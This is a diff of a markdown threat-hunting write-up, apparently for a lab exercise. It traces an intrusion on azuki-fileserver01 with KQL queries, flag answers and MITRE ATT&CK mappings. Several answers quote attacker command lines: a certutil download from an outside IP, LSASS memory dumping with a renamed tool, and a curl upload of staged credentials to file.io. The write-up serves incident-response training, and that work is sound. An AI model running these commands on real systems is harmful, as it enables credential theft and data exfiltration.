@@ -35,6 +35,8 @@ Question: Identify the source IP address of the return connection?
 ```
 159.26.106.98
 ```
+---
+
 # Flag 2: LATERAL MOVEMENT - Compromised Device
 The purpose of using this query is to:
 
@@ -43,22 +45,25 @@ The purpose of using this query is to:
 - Track where logins originated from using the **RemoteIP** field
 - Reconstruct the attacker timeline by sorting logon events **chronologically** in ascending order. 
 
-  Query Used:
-  ```
+Query Used:
+
+```
   DeviceLogonEvents
   | where DeviceName contains "azuki"
   | where Timestamp > datetime(2025-11-22T00:27:53.7487323Z)
   | where RemoteIP != ""
   | order by Timestamp asc
-  ```
-  Result:
+ ```
+Result:
   
-  ![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A5.png)
+![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A5.png)
 
-  Question: Identify the compromised file server device name?
-  ```
-  azuki-fileserver01
-  ```
+Question: Identify the compromised file server device name?
+
+```
+azuki-fileserver01
+```
+---
 
  # FLAG 3: LATERAL MOVEMENT - Compromised Account
 
@@ -74,7 +79,7 @@ The purpose of using this query is to:
  ```
   fileadmin
  ```
- 
+ ---
 
  # FLAG 4: DISCOVERY - Share Enumeration Command
 
@@ -117,6 +122,7 @@ Question: Identify the command used to enumerate local network shares?
 ```
 "net.exe" share
 ```
+---
 
 # FLAG 5: DISCOVERY - Remote Share Enumeration
 
@@ -146,6 +152,8 @@ The  query used identifies instances where net.exe was run on azuki-fileserver01
   "net.exe" view \\10.1.0.188
   ```
 
+---
+
   #  FLAG 6: DISCOVERY - Privilege Enumeration
 
   Understanding current user privileges and group memberships helps attackers determine what actions they can perform and whether privilege escalation is needed.
@@ -174,6 +182,8 @@ The  query used identifies instances where net.exe was run on azuki-fileserver01
   ```
    "whoami.exe" /all
   ```
+
+---
   
   # FLAG 7: DISCOVERY - Network Configuration Command
   
@@ -183,10 +193,10 @@ The  query used identifies instances where net.exe was run on azuki-fileserver01
 
   ipconfig.exe is commonly used to gather network configuration information, such as IP addresses, DNS servers, and network interfaces. Its execution often indicates network   discovery activity following access to a system.
 
-  MITRE ATT&CK Mapping
+  ### MITRE ATT&CK Mapping
 
   - Tactic: Discovery (TA0007)
-  - Technique: T1016 – Network Configuration Discovery
+  - Technique: T1016  Network Configuration Discovery
 
   Query Used: 
   
@@ -199,6 +209,7 @@ The  query used identifies instances where net.exe was run on azuki-fileserver01
 
   ![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A13.png)
 
+---
 
   #  FLAG 8: DEFENSE EVASION - Directory Hiding Command
   
@@ -206,11 +217,11 @@ The  query used identifies instances where net.exe was run on azuki-fileserver01
   
   attrib.exe is a native Windows utility used to view or modify file attributes (e.g., hidden, system, read-only). Attackers commonly use it to hide malicious files or         scripts by setting the Hidden or System attributes to reduce visibility.
   
-  MITRE ATT&CK Mapping
+  ### MITRE ATT&CK Mapping
 
   - Tactic: Defense Evasion (TA0005)
 
-  - Technique: T1564.001 – Hide Artifacts: Hidden Files and Directories
+  - Technique: T1564.001  Hide Artifacts: Hidden Files and Directories
 
   Query Used: 
 
@@ -231,13 +242,16 @@ The  query used identifies instances where net.exe was run on azuki-fileserver01
   "attrib.exe" +h +s C:\Windows\Logs\CBS
   ```
 
+---
+
   # FLAG 9: COLLECTION - Staging Directory Path
   
   Attackers establish staging locations to organise tools and stolen data before exfiltration. This directory path is a critical IOC.
 
   From the previous query, Drive C was the location where the data was collected.
 
-  MITRE ATT&CK Mapping
+  ### MITRE ATT&CK Mapping
+  
   - Tactic: Collection (TA0009)
   - Technique: T1074.001 – Data Staged: Local Data Staging
 
@@ -246,6 +260,7 @@ The  query used identifies instances where net.exe was run on azuki-fileserver01
   ```
   C:\Windows\Logs\CBS
   ```
+---
 
   # FLAG 10: DEFENSE EVASION - Script Download Command
 
@@ -272,7 +287,7 @@ The query then projects key investigation fields to help identify:
 
   - Which user ran it (AccountName)
 
-MITRE ATT&CK Mapping
+### MITRE ATT&CK Mapping
 
 Primary Technique
 
@@ -302,6 +317,7 @@ Result:
 ```
 "certutil.exe" -urlcache -f http://78.141.196.6:8080/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
 ```
+---
 
 # FLAG 11: COLLECTION - Credential File Discovery
 
@@ -317,12 +333,12 @@ This query searches file creation events on the device azuki-fileserver01 and id
 
   - The activity was performed by the fileadmin account
 
-MITRE ATT&CK Mapping
+### MITRE ATT&CK Mapping
 
-  - T1074.001 – Data Staged: Local Data Staging
+  - T1074.001  Data Staged: Local Data Staging
     - Collected data stored locally before exfiltration
 
-  - T1005 – Data from Local System
+  - T1005  Data from Local System
     - Data collected directly from the compromised system
 
   - T1552 – Unsecured Credentials
@@ -352,6 +368,8 @@ Question: What credential file was created in the staging directory?
 IT-Admin-Passwords.csv
 ```
 
+---
+
 # FLAG 12: COLLECTION - Recursive Copy Command
 
 Built-in system utilities are preferred for data staging as they're less likely to trigger security alerts. The exact command line reveals the attacker's methodology.
@@ -378,18 +396,18 @@ Displays:
 
   - Orders events chronologically, helping reconstruct attacker activity over time
 
-MITRE ATT&CK Mapping
+### MITRE ATT&CK Mapping
 
-  - T1074.001 – Data Staged: Local Data Staging
+  - T1074.001  Data Staged: Local Data Staging
     - Use of xcopy to gather and prepare files locally
 
-  - T1041 – Exfiltration Over C2 Channel
+  - T1041  Exfiltration Over C2 Channel
     - Use of HTTP-based commands to transfer data externally
 
-  - T1059 – Command and Scripting Interpreter
+  - T1059  Command and Scripting Interpreter
     - Execution of native Windows utilities, e.g., using cmd.exe, powershell.exe
   
-  - T1119 - Automated Collection
+  - T1119  Automated Collection
     - Adversaries may automate the collection of data of interest on the system to reduce the need for manual activity and speed up exfiltration
 
 Query Used: 
@@ -412,6 +430,8 @@ Question: What command was used to stage data from a network share?
 "xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y
 ```
 
+---
+
 # FLAG 13: COLLECTION - Compression Command
 
 Cross-platform compression tools indicate attacker sophistication. The full command line reveals the exact archiving methodology used.
@@ -428,9 +448,9 @@ It helps detect:
 
 This is useful for spotting lateral movement preparation or reconnaissance involving admin accounts.
 
-MITRE ATT&CK Mapping
+### MITRE ATT&CK Mapping
 
-  - T1560 – Archive Collected Data
+  - T1560  Archive Collected Data
     - Adversaries may compress or archive collected data into a single file (e.g., ZIP, TAR, RAR) to:
       - Simplify exfiltration
       - Reduce detection footprint
@@ -457,6 +477,7 @@ Question: What command was used to compress the staged collection data?
 ```
 "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin
 ```
+---
 
 # FLAG 14: CREDENTIAL ACCESS - Renamed Tool
 
@@ -473,11 +494,11 @@ The query used looks for file-related activity on the host azuki-fileserver01, w
 This helps detect executables being written, modified, or accessed in a directory that normally should not contain executables, which may indicate malware staging or persistence preparation.
 
 
-MITRE ATT&CK Mapping
+### MITRE ATT&CK Mapping
 
-  - T1036 – Masquerading
+  - T1036  Masquerading
     - Malicious executables hidden in legitimate Windows directories
-  - T1105 – Ingress Tool Transfer
+  - T1105  Ingress Tool Transfer
     - Executables introduced onto the system
  
 Query Used: 
@@ -502,6 +523,8 @@ Question: What was the renamed credential dumping tool?
 pd.exe
 ```
 
+---
+
 #  FLAG 15: CREDENTIAL ACCESS - Memory Dump Command
 
 The complete process memory dump command line is critical evidence showing exactly how credentials were extracted.
@@ -509,9 +532,9 @@ The complete process memory dump command line is critical evidence showing exact
 The query used searches process execution events where the executable was launched from the directory.
 This directory is normally used for Windows component servicing logs, not for running executables. Seeing processes execute from this path is highly suspicious and often indicates malware hiding in trusted system locations.
 
-MITRE ATT&CK Mapping 
+### MITRE ATT&CK Mapping 
 
-T1003.001 – OS Credential Dumping: LSASS Memory
+T1003.001  OS Credential Dumping: LSASS Memory
   -Adversaries dump the memory of the LSASS process to obtain credentials
 
 The presence of lsass.dmp indicates that the attacker:
@@ -543,6 +566,8 @@ Question: What command was used to dump process memory for credential extraction
 ```
  "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
 ```
+---
+
 #  FLAG 16: EXFILTRATION - Upload Command
 
 Command-line HTTP clients enable scriptable data transfers. The complete command syntax is essential for building detection rules.
@@ -571,18 +596,18 @@ Shows:
 
 - Sorts results chronologically, helping reconstruct attacker activity
 
-MITRE ATT&CK Mapping
+### MITRE ATT&CK Mapping
 
-  - T1041 – Exfiltration Over C2 Channel
+  - T1041  Exfiltration Over C2 Channel
     - Use of HTTP to exfiltrate data
 
-  - T1105 – Ingress Tool Transfer (if curl is used to download tools)
+  - T1105  Ingress Tool Transfer (if curl is used to download tools)
     - Files transferred via web protocols
 
-  - T1059 – Command and Scripting Interpreter
+  - T1059  Command and Scripting Interpreter
     - Execution of native tools via command line
 
-  - T1071.001 – Application Layer Protocol: Web Protocols
+  - T1071.001  Application Layer Protocol: Web Protocols
     - Use of HTTP/HTTPS for communication
   
 Query Used:
@@ -603,6 +628,7 @@ Question: What command was used to exfiltrate the staged data?
 ```
 "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
 ```
+---
 
 # FLAG 17: EXFILTRATION - Cloud Service
 
@@ -614,21 +640,21 @@ These services are favoured by attackers because
   - One-Time / Short-Lived Downloads: Files are often deleted after the first download or after a short time, reducing forensic evidence and making post-incident retrieval difficult
   - HTTPS-Based: Uses encrypted HTTPS, Payload contents are hidden from network inspection, Blends in with normal web traffic.
 
-MITRE ATT&CK Mapping
+### MITRE ATT&CK Mapping
 
-  - T1567.002 – Exfiltration to Cloud Storage
+  - T1567.002  Exfiltration to Cloud Storage
     - Uploading data to a public file-sharing service
 
-  - T1041 – Exfiltration Over C2 Channel
+  - T1041  Exfiltration Over C2 Channel
     - Data sent over HTTPS
 
-  - T1560 – Archive Collected Data
+  - T1560  Archive Collected Data
     - Credentials were compressed before exfiltration
 
-  - T1074.001 – Data Staged: Local
+  - T1074.001  Data Staged: Local
     - Data stored locally prior to upload
 
-  - T1059 – Command-Line Execution
+  - T1059  Command-Line Execution
     - Abuse of native CLI tools
 
   Query used:
@@ -648,6 +674,7 @@ MITRE ATT&CK Mapping
   ```
   file.io
   ```
+---
 
 # FLAG 18: PERSISTENCE - Registry Value Name
 
@@ -677,14 +704,14 @@ Specifically, it:
 
   - Orders results newest to oldest, making recent persistence activity easy to spot
 
-MITRE ATT&CK Mapping
+### MITRE ATT&CK Mapping
 
-  - T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
+  - T1547.001  Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
 
-  - T1036 – Masquerading
+  - T1036  Masquerading
     - If malicious payloads mimic legitimate system names or paths
 
-  - T1059 – Command and Scripting Interpreter
+  - T1059  Command and Scripting Interpreter
     - If scripts (PowerShell, CMD) are executed at startup
 
   Query Used: 
@@ -707,6 +734,7 @@ Question: What registry value name was used to establish persistence?
 ```
  FileShareSync
 ```
+---
 
 # FLAG 19: PERSISTENCE - Beacon Filename
 
@@ -723,15 +751,15 @@ Suspicious activity includes:
   - W Hidden: Hides the PowerShell window, preventing the user from seeing the script execution, a strong indicator of stealthy execution
   - File C:\Windows\System32\svchost.ps1: Executes a PowerShell script named svchost.ps1, svchost mimics a legitimate Windows binary
   
-MITRE ATT&CK Mapping
+### MITRE ATT&CK Mapping
 
-  - T1059.001 – Command and Scripting Interpreter: PowerShell
+  - T1059.001  Command and Scripting Interpreter: PowerShell
 
-  - T1036 – Masquerading
+  - T1036  Masquerading
 
-  - T1564.003 – Hide Artifacts: Hidden Window
+  - T1564.003  Hide Artifacts: Hidden Window
 
-  - T1027 – Obfuscated / Stealthy Execution 
+  - T1027  Obfuscated / Stealthy Execution 
 
 Result: 
 
@@ -742,6 +770,7 @@ Question: What is the persistence beacon filename?
 ```
 svchost.ps1
 ```
+---
 
 # FLAG 20: ANTI-FORENSICS - History File Deletion
 
@@ -760,18 +789,18 @@ It helps:
   - Review activity in reverse chronological order (most recent first)
 
 
-MITRE ATT&CK Mapping
+### MITRE ATT&CK Mapping
 
-  - T1070.004 – Indicator Removal on Host: File Deletion
+  - T1070.004  Indicator Removal on Host: File Deletion
 
     - Deleting files to remove forensic evidence
 
     - Common during post-exploitation cleanup
 
-  - T1565.001 – Stored Data Manipulation
+  - T1565.001  Stored Data Manipulation
     - If legitimate data is destroyed to impact availability
 
-  - T1005 – Data from Local System
+  - T1005  Data from Local System
     - If files were accessed before deletion
 
 Query Used: 
@@ -794,6 +823,8 @@ Question: What PowerShell history file was deleted?
 ```
 ConsoleHost_history.txt
 ```
+---
+
 ## Threat Hunt Finding:
 
 During this threat hunting exercise on `azuki-fileserver01` and related endpoints, multiple indicators of compromise and malicious behaviors were identified:
@@ -812,6 +843,8 @@ During this threat hunting exercise on `azuki-fileserver01` and related endpoint
 
 5. **Evidence Removal:**  
    File deletions targeting `.txt` files in user directories were observed, suggesting an attempt to remove artifacts and evade detection (T1070.004).
+
+---
 
 # Recommendation
 
